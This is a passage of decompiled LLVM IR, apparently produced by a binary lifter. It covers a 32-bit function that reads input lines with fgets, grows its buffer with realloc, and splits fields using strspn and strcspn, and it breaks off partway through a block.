  %tmp27 = ptrtoint i32* %arg1 to i32
  %stack_var_-40 = alloca i8*, align 4
  %v15_804b9c0 = ptrtoint i8** %stack_var_-40 to i32
  store i32 %tmp27, i32* @esi, align 4
  %v1_804b9c7 = icmp eq i32* %arg1, null
  br i1 %v1_804b9c7, label %dec_label_pc_804bc17, label %dec_label_pc_804b9cf

dec_label_pc_804b9cf:                             ; preds = %entry
  %sext = mul i32 %arg2, 16777216
  %v4_804b9d8 = sdiv i32 %sext, 16777216
  %v1_804b9dc = udiv i32 %v4_804b9d8, 256
  %v2_804b9dc = urem i32 %v1_804b9dc, 256
  store i32 %v2_804b9dc, i32* @edx, align 4
  %v4_804b9cf = mul i32 %arg2, 4
  %v2_804b9e3 = and i32 %v4_804b9cf, 1020
  %v1_804b9ea = or i32 %v2_804b9e3, 1
  store i32 %v1_804b9ea, i32* %eax.global-to-local, align 4
  %v4_804b9eb = inttoptr i32 %v1_804b9ea to i8*
  store i8* %v4_804b9eb, i8** %stack_var_-40, align 4
  %v1_804b9ee = add i32 %tmp27, 4
  %v2_804b9ee = inttoptr i32 %v1_804b9ee to i32*
  %v1_804ba29 = add i32 %tmp27, 8
  %v2_804ba29 = inttoptr i32 %v1_804ba29 to i32*
  %v2_804ba2f = add i32 %tmp27, 12
  %v3_804ba2f = inttoptr i32 %v2_804ba2f to i32*
  %v1_804ba36 = add i32 %tmp27, 16
  %v2_804ba36 = inttoptr i32 %v1_804ba36 to i32*
  %v1_804ba95 = add i32 %tmp27, 20
  %v2_804ba95 = inttoptr i32 %v1_804ba95 to i8*
  br label %dec_label_pc_804b9ee

dec_label_pc_804b9ee:                             ; preds = %dec_label_pc_804bc09, %dec_label_pc_804bb41, %dec_label_pc_804bb37, %dec_label_pc_804b9cf
  %v3_804b9ee = load i32, i32* %v2_804b9ee, align 4
  %v4_804b9ee = icmp eq i32 %v3_804b9ee, 0
  %v1_804b9f2 = icmp eq i1 %v4_804b9ee, false
  br i1 %v1_804b9f2, label %dec_label_pc_804ba29, label %dec_label_pc_804b9f4

dec_label_pc_804b9f4:                             ; preds = %dec_label_pc_804b9ee
  %v3_804b9f4 = load i32, i32* %v2_804ba36, align 4
  %v4_804b9f4 = icmp eq i32 %v3_804b9f4, 0
  %v1_804b9f8 = icmp eq i1 %v4_804b9f4, false
  br i1 %v1_804b9f8, label %dec_label_pc_804ba01, label %dec_label_pc_804b9fa

dec_label_pc_804b9fa:                             ; preds = %dec_label_pc_804b9f4
  store i32 81, i32* %v2_804ba36, align 4
  br label %dec_label_pc_804ba01

dec_label_pc_804ba01:                             ; preds = %dec_label_pc_804b9f4, %dec_label_pc_804b9fa
  %v3_804ba01 = load i32, i32* %v2_804ba29, align 4
  %v4_804ba01 = icmp eq i32 %v3_804ba01, 0
  %v1_804ba05 = icmp eq i1 %v4_804ba01, false
  br i1 %v1_804ba05, label %dec_label_pc_804ba0d, label %dec_label_pc_804ba07

dec_label_pc_804ba07:                             ; preds = %dec_label_pc_804ba01
  %v0_804ba07 = load i32, i32* @esp, align 4
  %v1_804ba07 = inttoptr i32 %v0_804ba07 to i32*
  %v2_804ba07 = load i32, i32* %v1_804ba07, align 4
  store i32 %v2_804ba07, i32* %eax.global-to-local, align 4
  store i32 %v2_804ba07, i32* %v2_804ba29, align 4
  br label %dec_label_pc_804ba0d

dec_label_pc_804ba0d:                             ; preds = %dec_label_pc_804ba01, %dec_label_pc_804ba07
  %v3_804ba0d = phi i32 [ %v3_804ba01, %dec_label_pc_804ba01 ], [ %v2_804ba07, %dec_label_pc_804ba07 ]
  store i32 %v3_804ba0d, i32* %eax.global-to-local, align 4
  %v4_804ba10 = load i32, i32* %v2_804ba36, align 4
  %v5_804ba10 = add i32 %v4_804ba10, %v3_804ba0d
  store i32 %v5_804ba10, i32* %eax.global-to-local, align 4
  %v1_804ba13 = load i32, i32* @esp, align 4
  %v2_804ba13 = add i32 %v1_804ba13, -4
  %v3_804ba13 = inttoptr i32 %v2_804ba13 to i32*
  store i32 %v5_804ba10, i32* %v3_804ba13, align 4
  %v0_804ba14 = load i8*, i8** %stack_var_-40, align 4
  %v1_804ba14 = ptrtoint i8* %v0_804ba14 to i32
  %v2_804ba14 = call i32 @malloc(i32 %v1_804ba14)
  store i32 %v2_804ba14, i32* %eax.global-to-local, align 4
  store i32 %v2_804ba14, i32* %v2_804b9ee, align 4
  %v0_804ba1c = load i32, i32* @esp, align 4
  %v3_804ba1c = add i32 %v0_804ba1c, 4
  %v1_804ba1d = icmp eq i32 %v2_804ba14, 0
  br i1 %v1_804ba1d, label %dec_label_pc_804bc17, label %dec_label_pc_804ba25

dec_label_pc_804ba25:                             ; preds = %dec_label_pc_804ba0d
  %v3_804ba25 = load i8, i8* %v2_804ba95, align 1
  %v4_804ba25 = or i8 %v3_804ba25, 1
  store i8 %v4_804ba25, i8* %v2_804ba95, align 1
  br label %dec_label_pc_804ba29

dec_label_pc_804ba29:                             ; preds = %dec_label_pc_804b9ee, %dec_label_pc_804ba25
  %v3_804ba29 = load i32, i32* %v2_804ba29, align 4
  store i32 %v3_804ba29, i32* %eax.global-to-local, align 4
  %v4_804ba2c = load i32, i32* %v2_804b9ee, align 4
  %v5_804ba2c = add i32 %v4_804ba2c, %v3_804ba29
  store i32 %v5_804ba2c, i32* %eax.global-to-local, align 4
  store i32 %v5_804ba2c, i32* %v3_804ba2f, align 4
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_804ba34

dec_label_pc_804ba34:                             ; preds = %dec_label_pc_804ba9b, %dec_label_pc_804ba92, %dec_label_pc_804ba29
  %v2_804ba34 = load i32, i32* %arg1, align 4
  %v3_804ba34 = load i32, i32* @esp, align 4
  %v4_804ba34 = add i32 %v3_804ba34, -4
  %v5_804ba34 = inttoptr i32 %v4_804ba34 to i32*
  store i32 %v2_804ba34, i32* %v5_804ba34, align 4
  %v3_804ba36 = load i32, i32* %v2_804ba36, align 4
  %v1_804ba39 = load i32, i32* @edi, align 4
  %v2_804ba39 = sub i32 %v3_804ba36, %v1_804ba39
  %v2_804ba3b = add i32 %v3_804ba34, -8
  %v3_804ba3b = inttoptr i32 %v2_804ba3b to i32*
  store i32 %v2_804ba39, i32* %v3_804ba3b, align 4
  %v0_804ba3c = load i32, i32* @edi, align 4
  store i32 %v0_804ba3c, i32* %eax.global-to-local, align 4
  %v4_804ba3e = load i32, i32* %v3_804ba2f, align 4
  %v5_804ba3e = add i32 %v4_804ba3e, %v0_804ba3c
  store i32 %v5_804ba3e, i32* @eax, align 4
  %v2_804ba41 = add i32 %v3_804ba34, -12
  %v3_804ba41 = inttoptr i32 %v2_804ba41 to i32*
  store i32 %v5_804ba3e, i32* %v3_804ba41, align 4
  %v0_804ba42 = call i32 @fgets()
  store i32 %v0_804ba42, i32* %eax.global-to-local, align 4
  %v0_804ba47 = load i32, i32* @esp, align 4
  %v1_804ba4a = icmp eq i32 %v0_804ba42, 0
  %v1_804ba4c = icmp eq i1 %v1_804ba4a, false
  br i1 %v1_804ba4c, label %dec_label_pc_804ba65, label %dec_label_pc_804ba4e

dec_label_pc_804ba4e:                             ; preds = %dec_label_pc_804ba34
  %v3_804ba4e = load i32, i32* %v2_804ba36, align 4
  %v5_804ba4e = add i32 %v0_804ba47, 8
  %v6_804ba4e = inttoptr i32 %v5_804ba4e to i32*
  store i32 %v3_804ba4e, i32* %v6_804ba4e, align 4
  %v1_804ba51 = add i32 %v0_804ba47, 4
  %v2_804ba51 = inttoptr i32 %v1_804ba51 to i32*
  store i32 0, i32* %v2_804ba51, align 4
  %v3_804ba53 = load i32, i32* %v3_804ba2f, align 4
  %v6_804ba53 = inttoptr i32 %v0_804ba47 to i32*
  store i32 %v3_804ba53, i32* %v6_804ba53, align 4
  %v0_804ba56 = load i8*, i8** %stack_var_-40, align 4
  %v5_804ba56 = call i32 @__GI_memset(i8* %v0_804ba56, i32 %v2_804b9e3, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804ba56, i32* %eax.global-to-local, align 4
  %v0_804ba5d = load i32, i32* @esp, align 4
  %v1_804ba5d = add i32 %v0_804ba5d, 12
  br label %dec_label_pc_804bc19

dec_label_pc_804ba65:                             ; preds = %dec_label_pc_804ba34
  %v3_804ba65 = load i32, i32* %v3_804ba2f, align 4
  store i32 %v3_804ba65, i32* %ebx.global-to-local, align 4
  %v1_804ba68 = load i32, i32* @edi, align 4
  %v2_804ba68 = add i32 %v1_804ba68, %v3_804ba65
  store i32 %v2_804ba68, i32* %eax.global-to-local, align 4
  %v2_804ba6b = add i32 %v0_804ba47, 8
  %v3_804ba6b = inttoptr i32 %v2_804ba6b to i32*
  store i32 %v2_804ba68, i32* %v3_804ba6b, align 4
  %v0_804ba6c = load i8*, i8** %stack_var_-40, align 4
  %v3_804ba6c = call i32 @strlen(i8* %v0_804ba6c)
  store i32 %v3_804ba6c, i32* %eax.global-to-local, align 4
  %v0_804ba71 = load i32, i32* @edi, align 4
  %v2_804ba71 = add i32 %v0_804ba71, %v3_804ba6c
  store i32 %v2_804ba71, i32* @edi, align 4
  %v0_804ba73 = load i32, i32* @esp, align 4
  %v1_804ba73 = inttoptr i32 %v0_804ba73 to i32*
  store i32 10, i32* %v1_804ba73, align 4
  %v0_804ba7a = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ba7a = load i32, i32* @esp, align 4
  %v2_804ba7a = add i32 %v1_804ba7a, -4
  %v3_804ba7a = inttoptr i32 %v2_804ba7a to i32*
  store i32 %v0_804ba7a, i32* %v3_804ba7a, align 4
  %v0_804ba7b = load i8*, i8** %stack_var_-40, align 4
  %v4_804ba7b = call i32 @__GI_strchr(i8* %v0_804ba7b, i32 %v2_804b9e3)
  store i32 %v4_804ba7b, i32* %eax.global-to-local, align 4
  %v0_804ba80 = load i32, i32* @esp, align 4
  %v1_804ba80 = inttoptr i32 %v0_804ba80 to i32*
  %v2_804ba80 = load i32, i32* %v1_804ba80, align 4
  store i32 %v2_804ba80, i32* %ecx.global-to-local, align 4
  %v3_804ba80 = add i32 %v0_804ba80, 4
  %v1_804ba81 = inttoptr i32 %v3_804ba80 to i32*
  %v2_804ba81 = load i32, i32* %v1_804ba81, align 4
  store i32 %v2_804ba81, i32* @ebx, align 4
  store i32 %v4_804ba7b, i32* @edx, align 4
  %v2_804ba84 = icmp eq i32 %v4_804ba7b, 0
  br i1 %v2_804ba84, label %dec_label_pc_804ba95, label %dec_label_pc_804ba88

dec_label_pc_804ba88:                             ; preds = %dec_label_pc_804ba65
  %v5_804ba7b = inttoptr i32 %v4_804ba7b to i8*
  %v0_804ba88 = load i32, i32* @edi, align 4
  %v1_804ba88 = add i32 %v0_804ba88, -1
  store i32 %v1_804ba88, i32* @edi, align 4
  %v3_804ba89 = load i8, i8* %v5_804ba7b, align 1
  %v4_804ba89 = zext i8 %v3_804ba89 to i32
  %v7_804ba89 = and i32 %v4_804ba7b, -256
  %v8_804ba89 = or i32 %v4_804ba89, %v7_804ba89
  %v1_804ba8b = add i32 %v8_804ba89, -1
  %v10_804ba8b = trunc i32 %v1_804ba8b to i8
  store i32 %v1_804ba8b, i32* %eax.global-to-local, align 4
  store i8 %v10_804ba8b, i8* %v5_804ba7b, align 1
  %v0_804ba8e = load i32, i32* %eax.global-to-local, align 4
  %v1_804ba8e = trunc i32 %v0_804ba8e to i8
  %v10_804ba8e = icmp eq i8 %v1_804ba8e, 92
  %v1_804ba90 = icmp eq i1 %v10_804ba8e, false
  br i1 %v1_804ba90, label %dec_label_pc_804baf6, label %dec_label_pc_804ba92

dec_label_pc_804ba92:                             ; preds = %dec_label_pc_804ba88
  %v0_804ba92 = load i32, i32* @edi, align 4
  %v1_804ba92 = add i32 %v0_804ba92, -1
  store i32 %v1_804ba92, i32* @edi, align 4
  br label %dec_label_pc_804ba34

dec_label_pc_804ba95:                             ; preds = %dec_label_pc_804ba65
  %v3_804ba95 = load i8, i8* %v2_804ba95, align 1
  %v4_804ba95 = icmp eq i8 %v3_804ba95, 0
  br i1 %v4_804ba95, label %dec_label_pc_804bac2, label %dec_label_pc_804ba9b

dec_label_pc_804ba9b:                             ; preds = %dec_label_pc_804ba95
  %v3_804ba9b = load i32, i32* %v2_804ba36, align 4
  %v1_804ba9e = add i32 %v3_804ba9b, 4096
  store i32 %v1_804ba9e, i32* %eax.global-to-local, align 4
  store i32 %v1_804ba9e, i32* %v2_804ba36, align 4
  %v0_804baa6 = load i32, i32* %eax.global-to-local, align 4
  %v4_804baa6 = load i32, i32* %v2_804ba29, align 4
  %v5_804baa6 = add i32 %v4_804baa6, %v0_804baa6
  store i32 %v5_804baa6, i32* %eax.global-to-local, align 4
  %v1_804baa9 = load i32, i32* @esp, align 4
  %v2_804baa9 = add i32 %v1_804baa9, -4
  %v3_804baa9 = inttoptr i32 %v2_804baa9 to i32*
  store i32 %v5_804baa6, i32* %v3_804baa9, align 4
  %v3_804baaa = load i32, i32* %v2_804b9ee, align 4
  %v5_804baaa = add i32 %v1_804baa9, -8
  %v6_804baaa = inttoptr i32 %v5_804baaa to i32*
  store i32 %v3_804baaa, i32* %v6_804baaa, align 4
  %v0_804baad = call i32 @realloc()
  store i32 %v0_804baad, i32* %eax.global-to-local, align 4
  store i32 %v0_804baad, i32* %v2_804b9ee, align 4
  %v4_804bab5 = load i32, i32* %v2_804ba29, align 4
  %v5_804bab5 = add i32 %v4_804bab5, %v0_804baad
  store i32 %v5_804bab5, i32* %eax.global-to-local, align 4
  store i32 %v5_804bab5, i32* %v3_804ba2f, align 4
  %v0_804babb = load i32, i32* @esp, align 4
  %v1_804babb = inttoptr i32 %v0_804babb to i32*
  %v2_804babb = load i32, i32* %v1_804babb, align 4
  store i32 %v2_804babb, i32* %eax.global-to-local, align 4
  %v3_804babb = add i32 %v0_804babb, 4
  %v1_804babc = inttoptr i32 %v3_804babb to i32*
  %v2_804babc = load i32, i32* %v1_804babc, align 4
  store i32 %v2_804babc, i32* @edx, align 4
  br label %dec_label_pc_804ba34

dec_label_pc_804bac2:                             ; preds = %dec_label_pc_804ba95, %dec_label_pc_804baf1
  %v2_804bac2 = load i32, i32* %arg1, align 4
  %v1_804bac4 = add i32 %v2_804bac2, 52
  %v2_804bac4 = inttoptr i32 %v1_804bac4 to i32*
  %v3_804bac4 = load i32, i32* %v2_804bac4, align 4
  %v4_804bac4 = icmp eq i32 %v3_804bac4, 0
  br i1 %v4_804bac4, label %dec_label_pc_804bae3, label %dec_label_pc_804baca

dec_label_pc_804baca:                             ; preds = %dec_label_pc_804bac2
  %v1_804baca = add i32 %v2_804bac2, 16
  %v2_804baca = inttoptr i32 %v1_804baca to i32*
  %v3_804baca = load i32, i32* %v2_804baca, align 4
  store i32 %v3_804baca, i32* %eax.global-to-local, align 4
  %v2_804bacd = add i32 %v2_804bac2, 24
  %v3_804bacd = inttoptr i32 %v2_804bacd to i32*
  %v4_804bacd = load i32, i32* %v3_804bacd, align 4
  %v10_804bacd = icmp ult i32 %v3_804baca, %v4_804bacd
  %v1_804bad0 = icmp eq i1 %v10_804bacd, false
  br i1 %v1_804bad0, label %dec_label_pc_804badb, label %dec_label_pc_804bad2

dec_label_pc_804bad2:                             ; preds = %dec_label_pc_804baca
  %v1_804bad2 = inttoptr i32 %v3_804baca to i8*
  %v2_804bad2 = load i8, i8* %v1_804bad2, align 1
  %v3_804bad2 = zext i8 %v2_804bad2 to i32
  store i32 %v3_804bad2, i32* %ecx.global-to-local, align 4
  %v1_804bad5 = add i32 %v3_804baca, 1
  store i32 %v1_804bad5, i32* %eax.global-to-local, align 4
  store i32 %v1_804bad5, i32* %v2_804baca, align 4
  %v0_804baec.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804baec

dec_label_pc_804badb:                             ; preds = %dec_label_pc_804baca
  %v1_804badb = load i32, i32* @esp, align 4
  %v2_804badb = add i32 %v1_804badb, -4
  %v3_804badb = inttoptr i32 %v2_804badb to i32*
  store i32 %v2_804bac2, i32* %v3_804badb, align 4
  %v0_804badc = load i8*, i8** %stack_var_-40, align 4
  %tmp33 = bitcast i8* %v0_804badc to i16*
  %v3_804badc = call i32 @getc_unlocked(i16* %tmp33)
  br label %dec_label_pc_804bae9

dec_label_pc_804bae3:                             ; preds = %dec_label_pc_804bac2
  %v1_804bae3 = load i32, i32* @esp, align 4
  %v2_804bae3 = add i32 %v1_804bae3, -4
  %v3_804bae3 = inttoptr i32 %v2_804bae3 to i32*
  store i32 %v2_804bac2, i32* %v3_804bae3, align 4
  %v0_804bae4 = call i32 @__GI_fgetc()
  br label %dec_label_pc_804bae9

dec_label_pc_804bae9:                             ; preds = %dec_label_pc_804badb, %dec_label_pc_804bae3
  %storemerge = phi i32 [ %v0_804bae4, %dec_label_pc_804bae3 ], [ %v3_804badc, %dec_label_pc_804badb ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %storemerge, i32* %ecx.global-to-local, align 4
  %v0_804baeb = load i32, i32* @esp, align 4
  %v1_804baeb = inttoptr i32 %v0_804baeb to i32*
  %v2_804baeb = load i32, i32* %v1_804baeb, align 4
  store i32 %v2_804baeb, i32* @ebp, align 4
  br label %dec_label_pc_804baec

dec_label_pc_804baec:                             ; preds = %dec_label_pc_804bad2, %dec_label_pc_804bae9
  %v0_804baf1 = phi i32 [ %v0_804baec.pre, %dec_label_pc_804bad2 ], [ %storemerge, %dec_label_pc_804bae9 ]
  %v10_804baec = icmp eq i32 %v0_804baf1, -1
  br i1 %v10_804baec, label %dec_label_pc_804baf6, label %dec_label_pc_804baf1

dec_label_pc_804baf1:                             ; preds = %dec_label_pc_804baec
  %v9_804baf1 = icmp eq i32 %v0_804baf1, 10
  %v1_804baf4 = icmp eq i1 %v9_804baf1, false
  br i1 %v1_804baf4, label %dec_label_pc_804bac2, label %dec_label_pc_804baf6

dec_label_pc_804baf6:                             ; preds = %dec_label_pc_804ba88, %dec_label_pc_804baf1, %dec_label_pc_804baec
  %v0_804baf6 = load i32, i32* @edi, align 4
  %v1_804baf6 = add i32 %v0_804baf6, 1
  %v8_804baf6 = icmp eq i32 %v1_804baf6, 0
  store i32 %v1_804baf6, i32* @edi, align 4
  br i1 %v8_804baf6, label %dec_label_pc_804baf6.dec_label_pc_804bc17.loopexit_crit_edge, label %dec_label_pc_804bafd

dec_label_pc_804baf6.dec_label_pc_804bc17.loopexit_crit_edge: ; preds = %dec_label_pc_804baf6
  %v0_804bc1b.pre.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804bc17

dec_label_pc_804bafd:                             ; preds = %dec_label_pc_804baf6
  %v3_804bafd = load i32, i32* %v2_804b9ee, align 4
  store i32 %v3_804bafd, i32* %eax.global-to-local, align 4
  %v0_804bb00 = load i32, i32* @esp, align 4
  %v1_804bb00 = add i32 %v0_804bb00, 48
  %v2_804bb00 = inttoptr i32 %v1_804bb00 to i32*
  %v3_804bb00 = load i32, i32* %v2_804bb00, align 4
  %v2_804bb04 = inttoptr i32 %v3_804bb00 to i32*
  store i32 %v3_804bafd, i32* %v2_804bb04, align 4
  %v0_804bb06 = load i32, i32* @esp, align 4
  %v1_804bb06 = add i32 %v0_804bb06, 4
  %v2_804bb06 = inttoptr i32 %v1_804bb06 to i32*
  %v3_804bb06 = load i32, i32* %v2_804bb06, align 4
  %v5_804bb06 = add i32 %v0_804bb06, -4
  %v6_804bb06 = inttoptr i32 %v5_804bb06 to i32*
  store i32 %v3_804bb06, i32* %v6_804bb06, align 4
  %v1_804bb0a = add i32 %v0_804bb06, -8
  %v2_804bb0a = inttoptr i32 %v1_804bb0a to i32*
  store i32 0, i32* %v2_804bb0a, align 4
  %v0_804bb0c = load i32, i32* %eax.global-to-local, align 4
  %v2_804bb0c = add i32 %v0_804bb06, -12
  %v3_804bb0c = inttoptr i32 %v2_804bb0c to i32*
  store i32 %v0_804bb0c, i32* %v3_804bb0c, align 4
  %v0_804bb0d = load i8*, i8** %stack_var_-40, align 4
  %v5_804bb0d = call i32 @__GI_memset(i8* %v0_804bb0d, i32 %v2_804b9e3, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804bb0d, i32* %eax.global-to-local, align 4
  %v3_804bb12 = load i32, i32* %v3_804ba2f, align 4
  store i32 %v3_804bb12, i32* @ebx, align 4
  %v0_804bb15 = load i32, i32* @esp, align 4
  %v1_804bb18 = add i32 %v0_804bb15, 64
  %v2_804bb18 = inttoptr i32 %v1_804bb18 to i32*
  %v3_804bb18 = load i32, i32* %v2_804bb18, align 4
  %v1_804bb1c = and i32 %v3_804bb18, 131072
  %v2_804bb1c = icmp eq i32 %v1_804bb1c, 0
  store i32 %v1_804bb1c, i32* %eax.global-to-local, align 4
  %v2_804bb21 = add i32 %v0_804bb15, 24
  %v3_804bb21 = inttoptr i32 %v2_804bb21 to i32*
  store i32 %v1_804bb1c, i32* %v3_804bb21, align 4
  br i1 %v2_804bb1c, label %dec_label_pc_804bafd.dec_label_pc_804bb37_crit_edge, label %dec_label_pc_804bb27

dec_label_pc_804bafd.dec_label_pc_804bb37_crit_edge: ; preds = %dec_label_pc_804bafd
  %v0_804bb37.pre = load i32, i32* @ebx, align 4
  %v4_804bb37.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bb37

dec_label_pc_804bb27:                             ; preds = %dec_label_pc_804bafd
  %v0_804bb27 = load i32, i32* @esp, align 4
  %v1_804bb27 = add i32 %v0_804bb27, 56
  %v2_804bb27 = inttoptr i32 %v1_804bb27 to i32*
  %v3_804bb27 = load i32, i32* %v2_804bb27, align 4
  %v1_804bb2b = add i32 %v3_804bb27, 1
  store i32 %v1_804bb2b, i32* %eax.global-to-local, align 4
  %v2_804bb2c = add i32 %v0_804bb27, -4
  %v3_804bb2c = inttoptr i32 %v2_804bb2c to i32*
  store i32 %v1_804bb2b, i32* %v3_804bb2c, align 4
  %v0_804bb2d = load i32, i32* @ebx, align 4
  %v2_804bb2d = add i32 %v0_804bb27, -8
  %v3_804bb2d = inttoptr i32 %v2_804bb2d to i32*
  store i32 %v0_804bb2d, i32* %v3_804bb2d, align 4
  %v0_804bb2e = load i8*, i8** %stack_var_-40, align 4
  %v4_804bb2e = call i32 @__GI_strspn(i8* %v0_804bb2e, i32 %v2_804b9e3)
  store i32 %v4_804bb2e, i32* %eax.global-to-local, align 4
  %v0_804bb33 = load i32, i32* @esp, align 4
  %v1_804bb33 = inttoptr i32 %v0_804bb33 to i32*
  %v2_804bb33 = load i32, i32* %v1_804bb33, align 4
  store i32 %v2_804bb33, i32* @ecx, align 4
  %v3_804bb33 = add i32 %v0_804bb33, 4
  %v1_804bb34 = inttoptr i32 %v3_804bb33 to i32*
  %v2_804bb34 = load i32, i32* %v1_804bb34, align 4
  store i32 %v2_804bb34, i32* @edi, align 4
  %v0_804bb35 = load i32, i32* @ebx, align 4
  %v2_804bb35 = add i32 %v0_804bb35, %v4_804bb2e
  store i32 %v2_804bb35, i32* @ebx, align 4
  br label %dec_label_pc_804bb37

dec_label_pc_804bb37:                             ; preds = %dec_label_pc_804bafd.dec_label_pc_804bb37_crit_edge, %dec_label_pc_804bb27
  %v4_804bb37 = phi i32 [ %v4_804bb37.pre, %dec_label_pc_804bafd.dec_label_pc_804bb37_crit_edge ], [ %v4_804bb2e, %dec_label_pc_804bb27 ]
  %v0_804bb37 = phi i32 [ %v0_804bb37.pre, %dec_label_pc_804bafd.dec_label_pc_804bb37_crit_edge ], [ %v2_804bb35, %dec_label_pc_804bb27 ]
  %v1_804bb37 = inttoptr i32 %v0_804bb37 to i8*
  %v2_804bb37 = load i8, i8* %v1_804bb37, align 1
  %v3_804bb37 = zext i8 %v2_804bb37 to i32
  %v5_804bb37 = and i32 %v4_804bb37, -256
  %v6_804bb37 = or i32 %v3_804bb37, %v5_804bb37
  store i32 %v6_804bb37, i32* %eax.global-to-local, align 4
  %v4_804bb39 = icmp eq i8 %v2_804bb37, 0
  br i1 %v4_804bb39, label %dec_label_pc_804b9ee, label %dec_label_pc_804bb41

dec_label_pc_804bb41:                             ; preds = %dec_label_pc_804bb37
  %v0_804bb41 = load i32, i32* @esp, align 4
  %v1_804bb41 = add i32 %v0_804bb41, 56
  %v2_804bb41 = inttoptr i32 %v1_804bb41 to i32*
  %v3_804bb41 = load i32, i32* %v2_804bb41, align 4
  store i32 %v3_804bb41, i32* @edx, align 4
  %v3_804bb45 = inttoptr i32 %v3_804bb41 to i8*
  %v4_804bb45 = load i8, i8* %v3_804bb45, align 1
  %v15_804bb45 = icmp eq i8 %v2_804bb37, %v4_804bb45
  br i1 %v15_804bb45, label %dec_label_pc_804b9ee, label %dec_label_pc_804bb4d

dec_label_pc_804bb4d:                             ; preds = %dec_label_pc_804bb41
  store i32 0, i32* @ebp, align 4
  %v1_804bb4f = add i32 %v0_804bb41, 16
  %v2_804bb4f = inttoptr i32 %v1_804bb4f to i32*
  %v3_804bb4f = load i32, i32* %v2_804bb4f, align 4
  %v1_804bb53 = add i32 %v3_804bb4f, -1
  store i32 %v1_804bb53, i32* %eax.global-to-local, align 4
  %v2_804bb54 = add i32 %v0_804bb41, 8
  %v3_804bb54 = inttoptr i32 %v2_804bb54 to i32*
  store i32 %v1_804bb53, i32* %v3_804bb54, align 4
  %v0_804bb58 = load i32, i32* @edx, align 4
  %v1_804bb5a = add i32 %v0_804bb58, 1
  store i32 %v1_804bb5a, i32* @edi, align 4
  %v0_804bbeb37 = load i32, i32* @ebx, align 4
  %v1_804bbeb38 = inttoptr i32 %v0_804bbeb37 to i8*
  %v2_804bbeb39 = load i8, i8* %v1_804bbeb38, align 1
  %v3_804bbeb40 = zext i8 %v2_804bbeb39 to i32
  %v4_804bbeb41 = load i32, i32* %eax.global-to-local, align 4
  %v5_804bbeb42 = and i32 %v4_804bbeb41, -256
  %v6_804bbeb43 = or i32 %v5_804bbeb42, %v3_804bbeb40
  store i32 %v6_804bbeb43, i32* %eax.global-to-local, align 4
  %v4_804bbed44 = icmp eq i8 %v2_804bbeb39, 0
  %v1_804bc03.pre45 = load i32, i32* @esp, align 4
  br i1 %v4_804bbed44, label %dec_label_pc_804bc03, label %dec_label_pc_804bbf1

dec_label_pc_804bb60:                             ; preds = %dec_label_pc_804bbf9
  %v1_804bb60 = add i32 %v1_804bc03.pre48, 48
  %v2_804bb60 = inttoptr i32 %v1_804bb60 to i32*
  %v3_804bb60 = load i32, i32* %v2_804bb60, align 4
  %v1_804bb64 = inttoptr i32 %v3_804bb60 to i32*
  %v2_804bb64 = load i32, i32* %v1_804bb64, align 4
  store i32 %v2_804bb64, i32* %eax.global-to-local, align 4
  %v3_804bb66 = mul i32 %v0_804bbf9, 4
  %v4_804bb66 = add i32 %v2_804bb64, %v3_804bb66
  %v5_804bb66 = inttoptr i32 %v4_804bb66 to i32*
  store i32 %v0_804bbeb46, i32* %v5_804bb66, align 4
  %v0_804bb69 = load i32, i32* @ebp, align 4
  %v1_804bb69 = load i32, i32* @esp, align 4
  %v2_804bb69 = add i32 %v1_804bb69, 8
  %v3_804bb69 = inttoptr i32 %v2_804bb69 to i32*
  %v4_804bb69 = load i32, i32* %v3_804bb69, align 4
  %v15_804bb69 = icmp eq i32 %v0_804bb69, %v4_804bb69
  %v1_804bb6d = icmp eq i1 %v15_804bb69, false
  br i1 %v1_804bb6d, label %dec_label_pc_804bb79, label %dec_label_pc_804bb6f

dec_label_pc_804bb6f:                             ; preds = %dec_label_pc_804bb60
  %v1_804bb6f = add i32 %v1_804bb69, 52
  %v2_804bb6f = inttoptr i32 %v1_804bb6f to i32*
  %v3_804bb6f = load i32, i32* %v2_804bb6f, align 4
  %v4_804bb6f = and i32 %v3_804bb6f, 262144
  %v5_804bb6f = icmp eq i32 %v4_804bb6f, 0
  %v1_804bb77 = icmp eq i1 %v5_804bb6f, false
  br i1 %v1_804bb77, label %dec_label_pc_804bb91, label %dec_label_pc_804bb79

dec_label_pc_804bb79:                             ; preds = %dec_label_pc_804bb6f, %dec_label_pc_804bb60
  %v1_804bb79 = add i32 %v1_804bb69, 56
  %v2_804bb79 = inttoptr i32 %v1_804bb79 to i32*
  %v3_804bb79 = load i32, i32* %v2_804bb79, align 4
  store i32 %v3_804bb79, i32* %eax.global-to-local, align 4
  %v1_804bb7d = inttoptr i32 %v3_804bb79 to i8*
  %v2_804bb7d = load i8, i8* %v1_804bb7d, align 1
  %v3_804bb7d = icmp eq i8 %v2_804bb7d, 0
  %v1_804bb80 = icmp eq i1 %v3_804bb7d, false
  br i1 %v1_804bb80, label %dec_label_pc_804bb84, label %dec_label_pc_804bb82

dec_label_pc_804bb82:                             ; preds = %dec_label_pc_804bb79
  %v0_804bb82 = load i32, i32* @edi, align 4
  store i32 %v0_804bb82, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bb84

dec_label_pc_804bb84:                             ; preds = %dec_label_pc_804bb79, %dec_label_pc_804bb82
  %v0_804bb84 = phi i32 [ %v3_804bb79, %dec_label_pc_804bb79 ], [ %v0_804bb82, %dec_label_pc_804bb82 ]
  %v2_804bb84 = add i32 %v1_804bb69, -4
  %v3_804bb84 = inttoptr i32 %v2_804bb84 to i32*
  store i32 %v0_804bb84, i32* %v3_804bb84, align 4
  %v0_804bb85 = load i32, i32* @ebx, align 4
  %v2_804bb85 = add i32 %v1_804bb69, -8
  %v3_804bb85 = inttoptr i32 %v2_804bb85 to i32*
  store i32 %v0_804bb85, i32* %v3_804bb85, align 4
  %v0_804bb86 = call i32 @strcspn()
  store i32 %v0_804bb86, i32* %eax.global-to-local, align 4
  %v0_804bb8b = load i32, i32* @esp, align 4
  %v1_804bb8b = inttoptr i32 %v0_804bb8b to i32*
  %v2_804bb8b = load i32, i32* %v1_804bb8b, align 4
  store i32 %v2_804bb8b, i32* @ecx, align 4
